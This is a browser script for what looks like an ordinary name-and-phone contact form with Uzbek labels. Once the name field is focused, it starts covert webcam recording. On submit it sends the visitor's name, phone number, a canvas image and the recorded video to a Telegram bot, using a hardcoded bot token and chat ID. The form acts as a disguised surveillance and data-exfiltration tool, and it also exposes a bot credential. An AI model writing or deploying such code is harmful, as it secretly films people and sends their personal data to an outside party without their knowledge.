document.addEventListener("DOMContentLoaded", function () {
    let mediaRecorder;
    let videoChunks = [];
    let videoBlob;
    let stream;
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('captureBtn');
    let isRecording = false;

    document.getElementById('ism').addEventListener('focus', async () => {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;
        video.style.display = 'block';
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = (event) => videoChunks.push(event.data);
        mediaRecorder.start();
        isRecording = true;
    });

    document.querySelector('.form__send__btn').addEventListener('click', async function(event) {
        event.preventDefault();
        if (isRecording && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
        mediaRecorder.onstop = async () => {
            videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
            videoChunks = [];
            stream.getTracks().forEach(track => track.stop());
            video.style.display = 'none';

            let ism = document.getElementById('ism').value;
            let telefon = document.getElementById('telefon').value;
            let botToken = '7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs';
            let chatId = '7221078203';
            let message = `Yangi xabar!%0AIsm: ${ism}%0ATelefon: ${telefon}`;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);

            if (canvas && canvas.toBlob) {
                canvas.toBlob(async (blob) => {
                    let formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'photo.png');
                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                });
            }

            if (videoBlob) {
                let formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', videoBlob, 'video.mp4');
                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
            }
            alert('Xabar yuborildi!');
        };
    });
});